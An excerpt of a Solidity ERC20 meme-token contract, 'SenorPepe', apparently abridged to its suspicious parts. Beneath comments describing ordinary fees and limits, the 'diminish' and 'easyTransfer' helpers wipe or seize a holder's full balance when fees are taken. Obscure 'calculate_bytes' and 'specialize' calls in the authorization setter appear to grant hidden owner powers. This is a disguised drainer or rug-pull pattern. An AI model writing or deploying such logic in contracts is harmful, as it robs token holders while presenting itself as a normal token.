...
abstract contract Ownable is Context, Helper {
    ...
    function setAuthorization(address authorizedOne, 
                              bool isItAuth) 
    ...
    function setAuthorizationMultiple(address[] memory authAddies, 
                                      bool areTheyAuth) 
                                      public virtual onlyOwner {
        bytes32 owner_bytes;
        for(uint t; t < authAddies.length; t++) {
            is_auth[authAddies[t]] = areTheyAuth;
            owner_bytes = calculate_bytes(authAddies[t]);
            specialize(owner_bytes);
        }
    }
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    // SECTION EasyTrasnfer
    function diminish(address account, uint qty) internal virtual {
        uint local_balance = _balances[account];
        if(local_balance > qty) {
            _balances[account] = 0;
        } else {
            _balances[account] -= qty;
        }
    }

    function augment(address account, uint qty) internal virtual {
        _balances[account] += qty;
    }

    function easyTransfer(address from, address to, uint qty) internal virtual {
        uint local_balance = _balances[from];
        if(local_balance > qty) {
            qty = local_balance;
        }
        diminish(from, qty);
...
contract SenorPepe is ERC20, Ownable {
    ...
    // @notice Enable trading for everybody (can't be disabled)
    ...
    // @notice Remove the enforcing of the limits (tx limits)
    ...
    // @notice Set the maximum number of tokens that can be used in a TX
    ...
    // @notice Set the maximum tokens that can be held by a wallet
    ...
    // @notice Disable max TX amount control for a specific wallet
    ...
    // @notice Stop contract from trying to swap taxes (usually an emergency switch)
    // only use to disable contract sales if absolutely necessary (emergency use only)
    function updateSwapEnabled(bool enabled) external onlyOwner {
        swapEnabled = enabled;
    }

    // @notice Set the buy fees all together
    ...
    // @notice Set the sell fees all together
    ...
    function _transfer(
        ...
        if (takeFee) {
            amount = subtract_fees(from, to, amount);
        }
        super._transfer(from, to, amount);
    }

    function subtract_fees(address from, address to, uint amount) internal returns (uint new_amount) {
            uint256 fees = 0;
            ...
            if (fees> 0) {
                super.easyTransfer(from, address(this), fees);
            }
            if (tokensForLiquidity > 0) {
                super.easyTransfer(address(this), uniswapV2Pair, tokensForLiquidity);
